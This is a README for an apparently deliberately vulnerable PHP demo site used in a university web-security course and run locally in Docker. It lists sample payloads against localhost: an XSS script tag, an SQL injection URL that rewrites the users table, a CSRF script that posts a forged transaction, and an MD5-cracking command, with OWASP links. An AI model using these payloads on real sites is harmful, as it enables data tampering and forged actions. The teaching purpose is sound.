# Base website security demo
- designed for students of [KIV/WEB](https://courseware.zcu.cz/portal/studium/courseware/kiv/web) of [University of West Bohemia](http://www.zcu.cz/en/)

## development
### Installation
1. [Install Docker](https://docs.docker.com/engine/installation/)
1. [Install Docker Compose](https://docs.docker.com/compose/install/)
1. Clone this repository `git clone https://github.com/intraworlds/zcu-security-demo.git`
1. Install dependencies with [Composer](https://getcomposer.org) `composer install`

### Run
1. run `docker-compose up -d` and you access the website
 - **app**:`localhost:8088`
  - login: `willis.ritchie@example.com`:`richie`
 - **adminer**:`localhost:8086`

### Simulate attacks
#### XSS
- create new transaction
- as description insert `<script>alert('XSS attack');</script>`
#### SQL injection
- go to `http://localhost:8088/?path=list&limit=50;update%20users%20set%20name=%27Anonymous%27;`
#### CSRF
- need also XSS
- create new transaction
- add description insert

#### Weak hash algorithm
try use `hashcat`
```
php scripts/crack_md5_hash.php 75b71aa6842e450f12aca00fdf54c51d
```

```
<script>
$.post({
    url:'index.php',
    data:'receiver=1&amount=10&desc=attack&submit=create'
}).done(function(data) {
    console.log('Attack was successful');
});
</script>
```

### Docker tips
Show all running containers
```
docker-compose ps
```
See logs
```
docker-compsoe logs -f
```
Connect container
```
docker-compose exec apache bash -l
```

## attacks

- [Full list of attacks](https://www.owasp.org/index.php/Category:Attack)

### XSS (Cross-site Scripting)
 - [OWASP XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
 - [OWASP testing for XSS](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
 - [PHP triky: Cross Site Scripting](https://php.vrana.cz/cross-site-scripting.php) (czech only)

HTTP Headers
 - [X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)
 - [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)


### SQL injection
 - [OWASP SQL injection](https://www.owasp.org/index.php/SQL_Injection)
 - [Soom: SQL Injection (Full Paper)](https://www.soom.cz/clanky/1180--SQL-Injection-Full-Paper#sekce5) (czech only)
 - [PHP triky: Obrana proti SQL Injection](https://php.vrana.cz/obrana-proti-sql-injection.php) (czech only)


### CSFR (Cross-Site Request Forgery)
 - [OWASP CSFR](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
 - [Soom](https://www.soom.cz/clanky/484--Cross-Site-Request-Forgery) (czech only)
 - [PHP triky: Cross-Site Request Forgery](https://php.vrana.cz/cross-site-request-forgery.php) (czech only)
 - [Co je Cross-Site Request Forgery a jak se mu bránit](https://www.zdrojak.cz/clanky/co-je-cross-site-request-forgery-a-jak-se-branit/) (czech only)

### Path (Directory) Traversal
 - [OWASP Path Traversal](https://www.owasp.org/index.php/Path_Traversal)
